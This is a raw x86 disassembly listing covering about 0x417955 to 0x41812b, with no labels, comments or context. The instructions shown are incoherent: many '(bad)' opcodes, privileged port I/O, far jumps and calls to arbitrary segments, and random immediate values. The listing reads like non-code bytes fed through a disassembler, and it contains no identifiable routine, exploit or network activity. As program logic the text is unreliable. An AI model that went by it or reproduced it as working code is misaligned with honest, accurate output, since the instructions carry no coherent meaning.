  417955:	adc    dl,BYTE PTR [esi]
  417957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417958:	imul   ebx,DWORD PTR [ebx-0x1e657b83],0xd2197b40
  417962:	or     eax,0x61c2a3b7
  417967:	xchg   ecx,eax
  417968:	cmp    dh,ah
  41796a:	mov    eax,ds:0x997244ac
  41796f:	sub    bl,0x20
  417972:	add    ebp,DWORD PTR [esi-0x898a6b2]
  417978:	cli    
  417979:	fisttp DWORD PTR [edx+0x4a]
  41797c:	sbb    al,0x8e
  41797e:	sub    al,0x3
  417980:	call   0x6eb2:0x4aa761e5
  417987:	fimul  DWORD PTR cs:[eax-0x739e4b99]
  41798e:	jl     0x41799d
  417990:	test   al,0x16
  417992:	sub    al,0xd7
  417994:	arpl   WORD PTR [edi],dx
  417996:	test   al,0xbc
  417998:	scas   al,BYTE PTR es:[edi]
  417999:	lahf   
  41799a:	xchg   edx,eax
  41799b:	and    eax,DWORD PTR [esi]
  41799d:	xchg   edx,eax
  41799e:	fnsave [edx-0x3b7ccbf3]
  4179a4:	in     eax,0x1a
  4179a6:	mov    bl,0x20
  4179a8:	pop    ebp
  4179a9:	std    
  4179aa:	sbb    BYTE PTR [ebx],bl
  4179ac:	cld    
  4179ad:	push   edx
  4179ae:	and    eax,0x5837c23a
  4179b3:	inc    esp
  4179b4:	sub    al,0xf8
  4179b6:	call   0x33ee4be
  4179bb:	js     0x417a36
  4179bd:	inc    edi
  4179be:	jno    0x4179e5
  4179c0:	xchg   ebx,eax
  4179c1:	cld    
  4179c2:	mov    edi,0x67d89497
  4179c7:	xchg   ebp,eax
  4179c8:	xchg   ebx,eax
  4179c9:	fnsave [edi+0x5]
  4179cc:	jg     0x41796d
  4179ce:	push   edx
  4179cf:	int    0x93
  4179d1:	xor    al,0x23
  4179d3:	xchg   ecx,eax
  4179d4:	retf   0x9928
  4179d7:	adc    DWORD PTR [edx-0x2a8ebcc0],ecx
  4179dd:	mov    WORD PTR [eax+0x68],?
  4179e0:	(bad)  
  4179e1:	sub    al,0x13
  4179e3:	and    edi,edi
  4179e5:	out    dx,eax
  4179e6:	aam    0x29
  4179e8:	xchg   esi,eax
  4179e9:	jbe    0x417a04
  4179eb:	jmp    0x14744de0
  4179f0:	(bad)
  4179f3:	sub    DWORD PTR [esi-0x28],esi
  4179f6:	dec    edi
  4179f7:	mov    al,0xac
  4179f9:	imul   esi,DWORD PTR gs:[ecx+0x39],0xc011ddb1
  417a01:	imul   edx,DWORD PTR [edx-0x24],0x27
  417a05:	dec    eax
  417a06:	mov    bl,0xdf
  417a08:	jae    0x417a84
  417a0a:	xchg   DWORD PTR [esp+eax*1-0x45],ecx
  417a0e:	xor    esi,ecx
  417a10:	retf   
  417a11:	imul   esp,DWORD PTR [edx],0xbeb18329
  417a17:	aam    0x94
  417a19:	bound  eax,QWORD PTR [edx-0x28]
  417a1c:	push   ebx
  417a1d:	adc    ah,BYTE PTR [eax-0x51]
  417a20:	cs mov ah,0xa6
  417a23:	inc    ecx
  417a24:	dec    edx
  417a25:	sbb    ebx,DWORD PTR ds:0x2b40bbd8
  417a2b:	mov    bh,BYTE PTR [edx-0x22ef5c90]
  417a31:	push   0xffffffee
  417a33:	arpl   WORD PTR [esi],sp
  417a35:	lock in al,dx
  417a37:	push   0x3
  417a39:	ss push es
  417a3b:	or     dh,BYTE PTR [ebx+ebx*2+0xc]
  417a3f:	mov    eax,ds:0x90a6689
  417a44:	mov    bh,0x46
  417a46:	add    DWORD PTR [edx],esi
  417a48:	in     al,0x48
  417a4a:	cwde   
  417a4b:	pop    ss
  417a4c:	mov    WORD PTR [edx-0x58727bf4],cs
  417a52:	imul   ebx,esi,0x1086a3cc
  417a58:	nop
  417a59:	js     0x417a0f
  417a5b:	jne    0x417a7f
  417a5d:	sub    DWORD PTR [esi-0x4cacc3a6],0xffffff87
  417a64:	out    0xc9,eax
  417a66:	out    0x90,eax
  417a68:	xor    bl,ch
  417a6a:	xchg   DWORD PTR [edi+0x16],eax
  417a6d:	push   ecx
  417a6e:	ret    
  417a6f:	popa   
  417a70:	xlat   BYTE PTR ds:[ebx]
  417a71:	test   eax,0xd10b52e7
  417a76:	inc    ebp
  417a77:	aaa    
  417a78:	jp     0x417a10
  417a7a:	sbb    bl,bl
  417a7c:	inc    eax
  417a7d:	std    
  417a7e:	sbb    eax,0x391bb2cb
  417a83:	jmp    0x7b5b95f6
  417a88:	rcr    dh,1
  417a8a:	push   eax
  417a8b:	jg     0x417ab0
  417a8d:	jne    0x417a11
  417a8f:	das    
  417a90:	xchg   esi,eax
  417a91:	stc    
  417a92:	ins    DWORD PTR es:[edi],dx
  417a93:	ret    
  417a94:	ror    DWORD PTR [ecx],0xa3
  417a97:	sbb    dl,cl
  417a99:	pop    ebx
  417a9a:	mov    eax,0x8dda5203
  417a9f:	xchg   esp,eax
  417aa0:	lahf   
  417aa1:	test   eax,0x8b3f5432
  417aa6:	call   0xa0c95e76
  417aab:	adc    eax,0xc57e9bd9
  417ab0:	pop    esi
  417ab1:	fstp   DWORD PTR [ecx-0x6b920f30]
  417ab7:	sub    ebp,DWORD PTR [eax]
  417ab9:	pusha  
  417aba:	jecxz  0x417ac6
  417abc:	popf   
  417abd:	push   edx
  417abe:	mov    gs,WORD PTR [ebx-0x7552f41]
  417ac4:	(bad)  
  417ac5:	lahf   
  417ac6:	enter  0x8f47,0x5b
  417aca:	out    dx,al
  417acb:	in     eax,dx
  417acc:	xchg   ebx,eax
  417acd:	adc    eax,0x2bf0f723
  417ad2:	or     BYTE PTR [edx-0x691998ca],bl
  417ad8:	in     al,dx
  417ad9:	aam    0xc2
  417adb:	lock mov al,ds:0x19714c30
  417ae1:	adc    BYTE PTR [edi-0x6b],cl
  417ae4:	jmp    0x417aea
  417ae6:	pop    esp
  417ae7:	or     cl,BYTE PTR [ecx+edx*8+0x22]
  417aeb:	mov    esi,0x469aaf6b
  417af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417af1:	push   edi
  417af2:	sub    bh,al
  417af4:	pop    es
  417af5:	jle    0x417a85
  417af7:	aas    
  417af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417af9:	dec    esi
  417afa:	pusha  
  417afb:	dec    esi
  417afc:	(bad)  
  417afe:	pop    esi
  417aff:	iret   
  417b00:	adc    ah,BYTE PTR [edi-0x6f2f32ba]
  417b06:	push   esp
  417b07:	and    BYTE PTR [edi],bl
  417b09:	data16 loop 0x417ae9
  417b0c:	icebp  
  417b0d:	mov    edx,0x8cc0de8b
  417b12:	jno    0x417ad3
  417b14:	in     eax,dx
  417b15:	int    0xac
  417b17:	jge    0x417adc
  417b19:	popw   ss
  417b1b:	int3   
  417b1c:	clc    
  417b1d:	push   eax
  417b1e:	leave  
  417b1f:	dec    esi
  417b20:	aaa    
  417b21:	xchg   esi,eax
  417b22:	test   al,0x47
  417b24:	pushf  
  417b25:	or     al,BYTE PTR [ebx+esi*1-0x74]
  417b29:	jecxz  0x417b43
  417b2b:	sbb    ch,0x74
  417b2e:	inc    edi
  417b2f:	outs   dx,DWORD PTR ds:[esi]
  417b30:	inc    esi
  417b31:	cs dec edx
  417b33:	enter  0xb73f,0xff
  417b37:	sbb    DWORD PTR [eax+0xf],0xffffffa9
  417b3b:	jg     0x417b10
  417b3d:	push   edx
  417b3e:	and    al,0x2a
  417b40:	ds ja  0x417b52
  417b43:	pop    ebp
  417b44:	nop
  417b45:	jmp    0x5f83:0xd72b1ab6
  417b4c:	test   eax,0x2cfabd12
  417b51:	pop    ds
  417b52:	mov    ch,0x83
  417b54:	xor    BYTE PTR ds:0x33c3cea1,ah
  417b5a:	xlat   BYTE PTR ds:[ebx]
  417b5b:	repnz pop edx
  417b5d:	dec    esi
  417b5e:	push   ds
  417b5f:	scas   al,BYTE PTR es:[edi]
  417b60:	pusha  
  417b61:	xchg   ebp,eax
  417b62:	or     al,0x23
  417b64:	sbb    esi,DWORD PTR [esi]
  417b66:	xchg   ebx,eax
  417b67:	jno    0x417b74
  417b69:	fs gs and cl,bl
  417b6d:	add    al,0x67
  417b6f:	mov    dh,0xa8
  417b71:	in     al,0xa1
  417b73:	adc    BYTE PTR ds:0xc3b1977d,dh
  417b79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b7a:	cmp    edx,edx
  417b7c:	lea    edi,[esi]
  417b7e:	stos   DWORD PTR es:[edi],eax
  417b7f:	mov    eax,0x1796d9b1
  417b84:	out    0xe1,al
  417b86:	push   es
  417b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b88:	and    eax,eax
  417b8a:	pop    ebx
  417b8b:	or     cl,ah
  417b8d:	ss adc al,0x63
  417b90:	out    0x70,al
  417b92:	in     al,dx
  417b93:	sbb    BYTE PTR [ecx],bl
  417b95:	sub    al,0x39
  417b97:	je     0x417b7f
  417b99:	jmp    0x6b5253aa
  417b9e:	sbb    ebp,DWORD PTR [esp+ecx*2+0x6bb2dfe3]
  417ba5:	pop    eax
  417ba6:	xor    ch,ch
  417ba8:	fsub   DWORD PTR [ecx]
  417baa:	stos   DWORD PTR es:[edi],eax
  417bab:	xchg   esp,eax
  417bac:	xor    ch,ch
  417bae:	je     0x417b85
  417bb0:	adc    al,0x3d
  417bb2:	push   0x68
  417bb4:	xchg   ebx,ebx
  417bb6:	jl     0x417b8e
  417bb8:	pop    esi
  417bb9:	repz push cs
  417bbb:	xchg   edi,esi
  417bbd:	sar    al,0xec
  417bc0:	add    al,0x47
  417bc2:	addr16 inc esi
  417bc4:	inc    ebx
  417bc5:	cmc    
  417bc6:	lock shl BYTE PTR [edi],0xe9
  417bca:	xchg   edx,eax
  417bcb:	mov    ds:0x448c5395,al
  417bd0:	int    0xc
  417bd2:	inc    edi
  417bd3:	loopne 0x417c05
  417bd5:	rcr    DWORD PTR [edx+0x4e],0x26
  417bd9:	push   edx
  417bda:	cmp    eax,0xfdf3e59
  417bdf:	(bad)  
  417be0:	pop    ss
  417be1:	repz cmc 
  417be3:	stos   DWORD PTR es:[edi],eax
  417be4:	mov    ah,0x50
  417be6:	lods   eax,DWORD PTR ds:[esi]
  417be7:	push   edx
  417be8:	ret    0x186e
  417beb:	xchg   esi,eax
  417bec:	mov    es,WORD PTR [ecx]
  417bee:	rcl    DWORD PTR [eax],0x9e
  417bf1:	call   0xbea:0xf722292f
  417bf8:	adc    BYTE PTR [eax+0x3c820af8],bh
  417bfe:	cdq    
  417bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c00:	shl    DWORD PTR [edi],1
  417c02:	or     ecx,DWORD PTR ds:0x2c8cb4c5
  417c08:	cdq    
  417c09:	in     eax,dx
  417c0a:	add    DWORD PTR [edx+0x44],edx
  417c0d:	ja     0x417c63
  417c0f:	es cs repz gs inc esi
  417c14:	inc    ebx
  417c15:	stos   BYTE PTR es:[edi],al
  417c16:	mov    eax,ds:0x5813c809
  417c1b:	pop    eax
  417c1c:	and    BYTE PTR [eax-0x48],dl
  417c1f:	or     BYTE PTR ds:[ecx+edi*8+0x5b],ch
  417c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c25:	loop   0x417c0e
  417c27:	push   ebx
  417c28:	out    dx,eax
  417c29:	mov    eax,ds:0x352becf2
  417c2e:	ins    DWORD PTR es:[edi],dx
  417c2f:	cmp    al,al
  417c31:	jge    0x417c2b
  417c33:	ja     0x417c55
  417c35:	ret    
  417c36:	adc    ebp,esp
  417c38:	dec    esi
  417c39:	add    dh,BYTE PTR [edi-0x60974dcc]
  417c3f:	mov    DWORD PTR [edi-0x3aa08b5d],esi
  417c45:	aas    
  417c46:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c48:	sbb    esi,ebp
  417c4a:	fidivr DWORD PTR [edx]
  417c4c:	mov    eax,0xaa68b5c6
  417c51:	jno    0x417c17
  417c53:	lea    esi,[edi]
  417c55:	ins    DWORD PTR es:[edi],dx
  417c56:	ja     0x417c75
  417c58:	inc    ebx
  417c59:	mov    ebp,0x368114f
  417c5e:	and    bh,BYTE PTR [edx-0x3c824218]
  417c64:	adc    eax,0x812497a7
  417c69:	int    0x82
  417c6b:	leave  
  417c6c:	push   eax
  417c6d:	js     0x417ce7
  417c6f:	jne    0x417c8e
  417c71:	pop    ecx
  417c72:	lods   al,BYTE PTR ds:[esi]
  417c73:	ror    BYTE PTR [ecx-0x68a38a63],cl
  417c79:	jmp    0xbb04daec
  417c7e:	mov    edx,0xf2702034
  417c83:	inc    ebx
  417c84:	lods   eax,DWORD PTR ds:[esi]
  417c85:	xchg   DWORD PTR [esi],eax
  417c87:	add    BYTE PTR ds:0xb03a0ec,0x33
  417c8e:	or     bl,bh
  417c90:	jge    0x417cef
  417c92:	retf   
  417c93:	sub    al,0x6a
  417c95:	fldcw  WORD PTR [edx]
  417c97:	cld    
  417c98:	sti    
  417c99:	or     eax,0x8a714d7c
  417c9e:	shl    bl,0x2d
  417ca1:	pushf  
  417ca2:	pop    esi
  417ca3:	mov    al,0xec
  417ca5:	clc    
  417ca6:	adc    bl,BYTE PTR [edi+0x21]
  417ca9:	retf   0x455b
  417cac:	push   eax
  417cad:	in     eax,dx
  417cae:	cmc    
  417caf:	push   es
  417cb0:	push   0x26195abd
  417cb5:	in     eax,dx
  417cb6:	into   
  417cb7:	sbb    DWORD PTR [eax],esi
  417cb9:	jp     0x417cc7
  417cbb:	bound  edx,QWORD PTR [esi]
  417cbd:	je     0x7dabc015
  417cc3:	mov    al,ds:0x323b5cca
  417cc8:	pop    ds
  417cc9:	push   edx
  417cca:	mov    edi,ebp
  417ccc:	jl     0x417c64
  417cce:	pop    ebx
  417ccf:	dec    edx
  417cd0:	sar    DWORD PTR [ebp+0xf6324ec],cl
  417cd6:	in     al,0x7
  417cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cd9:	jp     0x417ce7
  417cdb:	adc    bl,al
  417cdd:	push   edx
  417cde:	rcl    BYTE PTR [ebx+0x31e505f8],0xf4
  417ce5:	add    eax,0x4dec9c3c
  417cea:	mov    dl,0xa5
  417cec:	mov    WORD PTR ds:0x7dde83dd,es
  417cf2:	mov    DWORD PTR [ebp+0x10c0c460],ebp
  417cf8:	icebp  
  417cf9:	inc    esi
  417cfa:	sub    esi,edi
  417cfc:	mov    ds:0xf51d7f16,eax
  417d01:	es call edx
  417d04:	jmp    0x417d68
  417d06:	lea    edx,[ebx+0x65fe30a9]
  417d0c:	pop    es
  417d0d:	test   al,0xdb
  417d0f:	push   eax
  417d10:	sub    edi,esi
  417d12:	xor    ah,BYTE PTR [edx]
  417d14:	(bad)  
  417d15:	test   DWORD PTR [edx-0x5b],0xe44bff92
  417d1c:	fdivr  QWORD PTR [eax]
  417d1e:	or     eax,0x83e7fc72
  417d23:	push   esp
  417d24:	and    eax,0x93174805
  417d29:	aaa    
  417d2a:	rcr    esi,0xc5
  417d2d:	add    dl,0x91
  417d30:	call   0x783de0a6
  417d35:	lods   eax,DWORD PTR ds:[esi]
  417d36:	jno    0x417d1d
  417d38:	stos   BYTE PTR es:[edi],al
  417d39:	cld    
  417d3a:	mov    ecx,0x9d6a2d50
  417d3f:	jns    0x417ccb
  417d41:	xchg   esp,eax
  417d42:	add    eax,edx
  417d44:	or     al,0xbc
  417d46:	jp     0x417cec
  417d48:	jae    0x417cff
  417d4a:	dec    ebp
  417d4b:	jl     0x417d93
  417d4d:	mov    edx,0x1151c689
  417d52:	jle    0x417d0d
  417d54:	jecxz  0x417d12
  417d56:	pushf  
  417d57:	push   bx
  417d59:	out    dx,al
  417d5a:	push   cs
  417d5b:	jae    0x417d6c
  417d5d:	mov    ds,WORD PTR [ebx]
  417d5f:	pop    esp
  417d60:	sti    
  417d61:	sub    al,0xd1
  417d63:	imul   ebp,DWORD PTR [ebx-0x6d],0xf38e5c66
  417d6a:	mov    bh,0x14
  417d6c:	jbe    0x417d1a
  417d6e:	or     al,0xc9
  417d70:	sbb    eax,0xe9ec38c9
  417d75:	jb     0x417d9a
  417d77:	repnz xor eax,0x2810179b
  417d7d:	fstp   QWORD PTR [ebp-0x394a96e0]
  417d83:	push   esp
  417d84:	aaa    
  417d85:	push   ebp
  417d86:	jns    0x417dd1
  417d88:	fiadd  DWORD PTR [esi]
  417d8a:	shr    DWORD PTR [esi+0x53b4582e],cl
  417d90:	push   es
  417d91:	inc    edx
  417d92:	scas   eax,DWORD PTR es:[edi]
  417d93:	xlat   BYTE PTR ds:[ebx]
  417d94:	out    0x14,al
  417d96:	mov    eax,ds:0x7dcebb13
  417d9b:	ja     0x417da1
  417d9d:	aaa    
  417d9e:	xor    al,0x29
  417da0:	jnp    0x417d32
  417da2:	sbb    esp,0xa8b477ad
  417da8:	es cmc 
  417daa:	sbb    eax,0x94c094c1
  417daf:	xor    dh,dh
  417db1:	jbe    0x417dfb
  417db3:	sub    DWORD PTR [ebx+0x716e57c8],0xb84dd332
  417dbd:	xor    al,0x75
  417dbf:	push   edx
  417dc0:	sbb    ah,BYTE PTR [ebp+0x5b]
  417dc3:	inc    ebx
  417dc4:	pop    edx
  417dc5:	and    bl,BYTE PTR [eax]
  417dc7:	xchg   edi,eax
  417dc8:	mul    DWORD PTR [edx]
  417dca:	std    
  417dcb:	dec    ebp
  417dcc:	cdq    
  417dcd:	cmp    eax,0xf74ab95d
  417dd2:	cld    
  417dd3:	cdq    
  417dd4:	jo     0x417dbc
  417dd6:	mov    cl,0x8b
  417dd8:	pop    ds
  417dd9:	aas    
  417dda:	enter  0xa43b,0x53
  417dde:	push   esp
  417ddf:	mov    ds:0x4cfdd465,eax
  417de4:	stc    
  417de5:	and    bh,bh
  417de7:	jns    0x417daa
  417de9:	mov    ecx,ecx
  417deb:	pop    eax
  417dec:	mov    ch,0xde
  417dee:	es out dx,al
  417df0:	lea    esp,[ecx-0x1eb9d1da]
  417df6:	cmp    al,0x32
  417df8:	js     0x417e38
  417dfa:	sub    eax,0xa9159072
  417dff:	loop   0x417e34
  417e01:	push   es
  417e02:	je     0x417e7e
  417e04:	cwde   
  417e05:	mov    edi,0xec84c1f3
  417e0a:	shl    BYTE PTR [edx-0x1a],1
  417e0d:	dec    ecx
  417e0e:	scas   eax,DWORD PTR es:[edi]
  417e0f:	sti    
  417e10:	push   ss
  417e11:	mov    bl,0xfd
  417e13:	mov    dh,0x52
  417e15:	neg    edx
  417e17:	pop    esp
  417e18:	stc    
  417e19:	mov    ecx,DWORD PTR [ebx]
  417e1b:	mov    DWORD PTR [esi],edx
  417e1d:	push   eax
  417e1e:	clc    
  417e1f:	push   cs
  417e20:	loope  0x417df8
  417e22:	sbb    esp,DWORD PTR [edi+ebp*2+0x18]
  417e26:	sbb    edi,DWORD PTR [ebx-0x4a578995]
  417e2c:	int3   
  417e2d:	jbe    0x417db4
  417e2f:	popa   
  417e30:	mov    dh,0xa
  417e32:	inc    esp
  417e33:	mov    esi,0xbead4296
  417e38:	test   DWORD PTR [edi-0x72],edi
  417e3b:	sub    ch,BYTE PTR [esi]
  417e3d:	mov    eax,0x2932330d
  417e42:	rol    DWORD PTR [edi-0x23b14ebc],1
  417e48:	rcr    BYTE PTR [eax],1
  417e4a:	xchg   ebx,eax
  417e4b:	add    eax,0xe8c6277d
  417e50:	(bad)  
  417e51:	xor    edi,DWORD PTR [edx]
  417e53:	lds    edx,FWORD PTR [ecx-0x71]
  417e56:	xchg   DWORD PTR [eax+0x4b8f6493],ebp
  417e5c:	push   ebx
  417e5d:	mov    bl,0xbe
  417e5f:	pop    ss
  417e60:	daa    
  417e61:	mov    ah,0x25
  417e63:	mov    ss,WORD PTR ds:0x16413762
  417e69:	dec    edx
  417e6a:	mov    edx,DWORD PTR [ecx+0x3d38fec8]
  417e70:	mov    WORD PTR [ecx+ebp*1-0x6e],gs
  417e74:	loop   0x417ea2
  417e76:	hlt    
  417e77:	fidivr WORD PTR [eax]
  417e79:	ds sbb eax,eax
  417e7c:	xchg   esi,eax
  417e7d:	inc    esp
  417e7e:	jmp    0x417e71
  417e80:	dec    eax
  417e81:	xlat   BYTE PTR ds:[ebx]
  417e82:	xchg   ebx,eax
  417e83:	cmc    
  417e84:	(bad)  
  417e85:	sub    DWORD PTR [esi-0x4ea2113d],ebx
  417e8b:	cmp    esp,DWORD PTR [ebx+esi*4+0x6c071b2]
  417e92:	ret    0xac73
  417e95:	pop    ss
  417e96:	loop   0x417ed9
  417e98:	lahf   
  417e99:	inc    eax
  417e9a:	es ins BYTE PTR es:[edi],dx
  417e9c:	addr16 pop es
  417e9e:	cs push 0x45
  417ea1:	(bad)  
  417ea2:	xor    al,0xfd
  417ea4:	jbe    0x417ea2
  417ea6:	div    BYTE PTR [ecx+eiz*2-0x6d405e31]
  417ead:	inc    eax
  417eae:	loopne 0x417e62
  417eb0:	icebp  
  417eb1:	adc    BYTE PTR [ebp-0x6f],ch
  417eb4:	lods   al,BYTE PTR ds:[esi]
  417eb5:	ret    0x454f
  417eb8:	xchg   esi,eax
  417eb9:	xchg   ebx,eax
  417eba:	sub    dl,BYTE PTR [esp+edx*8]
  417ebd:	ja     0x417eb9
  417ebf:	out    dx,al
  417ec0:	push   cs
  417ec1:	scas   eax,DWORD PTR es:[edi]
  417ec2:	cmp    eax,0x4a54841
  417ec7:	sbb    BYTE PTR [edi],ch
  417ec9:	mov    esp,0x1c93a3a1
  417ece:	push   ds
  417ecf:	dec    esp
  417ed0:	jge    0x417f3f
  417ed2:	xchg   ecx,eax
  417ed3:	add    eax,0x152ae0e7
  417ed8:	inc    esp
  417ed9:	pop    esp
  417eda:	mov    ds:0xcb1aaa72,eax
  417edf:	add    dl,bl
  417ee1:	mov    edi,0xac6e1309
  417ee6:	mov    esi,0xb8f93776
  417eeb:	add    BYTE PTR [ebp-0x2ae76c48],bl
  417ef1:	pop    eax
  417ef2:	mov    ecx,0xb7e12cce
  417ef7:	fnsave [edx+0x3d]
  417efa:	push   edx
  417efb:	xor    esp,DWORD PTR [esi]
  417efd:	jp     0x417eb7
  417eff:	mov    ebp,0xb2a8b8e3
  417f04:	aam    0x57
  417f06:	ds jmp 0xf9a0:0x8b832938
  417f0e:	pop    esp
  417f0f:	push   ds
  417f10:	es (bad) 
  417f12:	mov    esi,0x9189ea9e
  417f17:	dec    ecx
  417f18:	pop    ds
  417f19:	inc    eax
  417f1a:	adc    ah,BYTE PTR [edi+0x61]
  417f1d:	jne    0x417ed5
  417f1f:	aad    0x6c
  417f21:	sub    BYTE PTR ds:0x9929303d,al
  417f27:	std    
  417f28:	push   es
  417f29:	inc    eax
  417f2a:	xor    DWORD PTR [ebp+0x117a3377],ecx
  417f30:	scas   eax,DWORD PTR es:[edi]
  417f31:	mov    ecx,0x6d566f62
  417f36:	mov    ds,WORD PTR [ebx-0x32111d6]
  417f3c:	hlt    
  417f3d:	adc    bh,BYTE PTR [ecx+0x69206a51]
  417f43:	js     0x417f3b
  417f45:	add    BYTE PTR [ecx*4-0x1521b8b9],ah
  417f4c:	or     BYTE PTR [edi+esi*2],ch
  417f4f:	jbe    0x417fa9
  417f51:	scas   eax,DWORD PTR es:[edi]
  417f52:	imul   DWORD PTR [eax]
  417f54:	xchg   ebp,eax
  417f55:	data16 fdiv QWORD PTR [ebp-0x54]
  417f59:	jg     0x417ee4
  417f5b:	adc    DWORD PTR [esi-0x62c3673d],esp
  417f61:	aam    0x96
  417f63:	popa   
  417f64:	inc    eax
  417f65:	outs   dx,BYTE PTR ds:[esi]
  417f66:	aad    0xdf
  417f68:	xchg   esi,eax
  417f69:	pop    ss
  417f6a:	mov    ebp,0x82f97675
  417f6f:	sbb    eax,0x271a852e
  417f74:	sbb    dl,ch
  417f76:	fs loope 0x417f7d
  417f79:	mov    bl,0x39
  417f7b:	sbb    esi,DWORD PTR ds:0xff3855c2
  417f81:	jbe    0x417fdf
  417f83:	ss mov dh,0x86
  417f86:	jge    0x417f49
  417f88:	pusha  
  417f89:	mov    BYTE PTR [esi-0x301bce96],dh
  417f8f:	lods   al,BYTE PTR ds:[esi]
  417f90:	pop    ss
  417f91:	cld    
  417f92:	dec    edx
  417f93:	test   al,0x41
  417f95:	les    edx,FWORD PTR [edi-0x17783957]
  417f9b:	js     0x417f54
  417f9d:	inc    ebp
  417f9e:	sub    eax,0xa6fc30f6
  417fa3:	popa   
  417fa4:	mov    WORD PTR [ebp-0x7f1d75d4],cs
  417faa:	dec    ecx
  417fab:	fisttp DWORD PTR [eax-0x1c89c0da]
  417fb1:	test   edx,eax
  417fb3:	ud0    eax,edi
  417fb6:	scas   al,BYTE PTR es:[edi]
  417fb7:	adc    al,0x87
  417fb9:	sbb    BYTE PTR [eax+0x62],cl
  417fbc:	sahf   
  417fbd:	or     DWORD PTR [ebp+edx*2+0x3a44567c],ebp
  417fc4:	cmp    al,0x44
  417fc6:	fs and al,0x88
  417fc9:	call   0x1cc6:0xeea758a0
  417fd0:	sub    dl,bl
  417fd2:	sub    eax,0xad652c2c
  417fd7:	push   es
  417fd8:	imul   DWORD PTR [eax]
  417fda:	xchg   BYTE PTR [eax+0xd],dh
  417fdd:	pusha  
  417fde:	pop    ss
  417fdf:	pop    ss
  417fe0:	jb     0x417fa3
  417fe2:	mov    ds:0x93663558,eax
  417fe7:	daa    
  417fe8:	(bad)  
  417fea:	int    0x79
  417fec:	mov    edx,0x6743563e
  417ff1:	test   eax,esi
  417ff3:	adc    bl,BYTE PTR [eax]
  417ff5:	sub    eax,0x77323991
  417ffa:	push   edi
  417ffb:	or     ax,0xa2a6
  417fff:	fst    DWORD PTR [ecx+0x79cc1c06]
  418005:	xchg   esi,eax
  418006:	sub    edx,ebp
  418008:	jmp    0x418041
  41800a:	(bad)  
  41800b:	lock adc BYTE PTR [edx-0x72],al
  41800f:	mov    ds:0xee5d20c6,eax
  418014:	adc    ch,ah
  418016:	jmp    0x803b:0xa5027189
  41801d:	cmp    BYTE PTR [edi],bl
  41801f:	retf   0x47e6
  418022:	or     dl,dh
  418024:	sahf   
  418025:	ds xchg edx,eax
  418027:	aaa    
  418028:	data16 (bad) 
  41802b:	aaa    
  41802c:	fisttp DWORD PTR [eax]
  41802e:	mov    esi,DWORD PTR [eax+0x1f29373e]
  418034:	jge    0x417fde
  418036:	or     edi,DWORD PTR [ebx-0x6897c0d0]
  41803c:	jne    0x4180a9
  41803e:	data16 and al,0x9b
  418041:	jb     0x418060
  418043:	(bad)
  418046:	imul   BYTE PTR [eax]
  418048:	mov    dh,0xb7
  41804a:	imul   ecx,DWORD PTR [ecx-0x5c45bbed],0xe37421b4
  418054:	daa    
  418055:	mov    ebp,0xa6e85878
  41805a:	mov    ds:0x513d2dde,al
  41805f:	loopne 0x41803f
  418061:	sahf   
  418062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418063:	in     eax,dx
  418064:	xchg   ecx,eax
  418065:	add    eax,0xbb5916dc
  41806a:	xor    DWORD PTR [edi],0x57
  41806d:	fs aaa 
  41806f:	mov    ebx,0x2285fc2f
  418074:	addr16 out 0x10,al
  418077:	jb     0x4180e8
  418079:	mov    ch,0xe
  41807b:	or     BYTE PTR [edx],bh
  41807d:	push   ss
  41807e:	sbb    al,0xa2
  418080:	sti    
  418081:	jmp    0x92c2:0x1e8ad3c0
  418088:	sub    bh,ah
  41808a:	adc    BYTE PTR [edi+0x22],dh
  41808d:	test   dl,ah
  41808f:	inc    esp
  418090:	cmc    
  418091:	push   0x1e
  418093:	mov    ah,0x54
  418095:	mov    cl,BYTE PTR [ebx-0x67a045d6]
  41809b:	dec    ebp
  41809c:	(bad)  
  41809d:	gs jle 0x418027
  4180a0:	pop    esi
  4180a1:	adc    al,BYTE PTR [ecx+0x20dd4e91]
  4180a7:	dec    ebp
  4180a8:	sbb    esp,esi
  4180aa:	push   ecx
  4180ab:	ror    edi,cl
  4180ad:	popa   
  4180ae:	adc    ah,dl
  4180b0:	cmp    ah,dl
  4180b2:	mov    eax,0x37180183
  4180b7:	popf   
  4180b8:	mov    fs,WORD PTR [eax]
  4180ba:	out    dx,al
  4180bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180bc:	add    DWORD PTR [ecx+0x2c5360fd],0x304a5ed5
  4180c6:	call   0x3f0cfa8
  4180cb:	push   ds
  4180cc:	jge    0x418096
  4180ce:	sti    
  4180cf:	out    0x51,eax
  4180d1:	xchg   ebp,eax
  4180d2:	sbb    DWORD PTR [ecx],eax
  4180d4:	or     BYTE PTR [edx],dl
  4180d6:	mov    esi,0xbe2f1c9f
  4180db:	jle    0xa01f50f6
  4180e1:	dec    edi
  4180e2:	repz add al,0x25
  4180e5:	fistp  WORD PTR [esi-0x43]
  4180e8:	mov    bl,0x77
  4180ea:	xchg   ebp,eax
  4180eb:	mov    ah,0x78
  4180ed:	mov    ch,BYTE PTR [esi]
  4180ef:	and    BYTE PTR [ecx+0x33153136],bh
  4180f5:	hlt    
  4180f6:	test   ah,bl
  4180f8:	push   0x25
  4180fa:	ror    BYTE PTR [ecx+0x18],0x57
  4180fe:	or     ah,BYTE PTR [eax+0x38cf4d41]
  418104:	clc    
  418105:	je     0x4180d0
  418107:	mov    BYTE PTR [esi-0x7],bh
  41810a:	clc    
  41810b:	mov    edx,0x5ed9fc7a
  418110:	rcr    BYTE PTR [eax+edi*8],1
  418113:	cdq    
  418114:	xchg   edi,eax
  418115:	shl    DWORD PTR [ecx-0x5d107cac],1
  41811b:	mov    DWORD PTR [ecx+0x4a],eax
  41811e:	mov    ds:0x7a8f25e6,eax
  418123:	jne    0x418171
  418125:	dec    ebp
  418126:	ffree  st(6)
  418128:	imul   ebx,DWORD PTR [ecx],0x5b
  41812b:	push   ebx
